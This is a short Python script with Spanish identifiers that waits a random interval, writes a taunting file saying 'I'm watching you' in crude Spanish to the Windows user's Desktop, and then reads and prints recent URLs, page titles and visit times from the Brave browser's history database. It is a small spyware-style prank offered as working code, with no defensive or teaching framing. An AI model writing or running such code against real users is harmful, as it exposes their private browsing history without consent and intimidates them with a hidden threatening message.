import os
import random
import sqlite3
from time import sleep

NAMEFILE = "QUE ONDA PUTO.txt"

def dormicion():
    n_hours = random.randrange(1, 4)
    print(n_hours)
    sleep(n_hours)


def crear_archivo(path):
    archivo = open(path + "\\OneDrive\\Escritorio\\" + NAMEFILE, "w")
    archivo.write("Te estoy mirando puto")
    return archivo


def history_chrome(Path):

    try:
        db_path = Path + "\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\History"
        connection = sqlite3.connect(db_path)
        cursor = connection.cursor()
        cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC")
        urls = cursor.fetchall()
        return urls
    except sqlite3.OperationalError:
        return None


def main():
    Path = "C:\\Users\\" + os.getlogin()
    dormicion()
    hackerfile = crear_archivo(Path)
    urls = history_chrome(Path)
    if urls != None:
        print(urls)
    else:
        print("La base de datos esta abierta")


if __name__ == "__main__":
    main()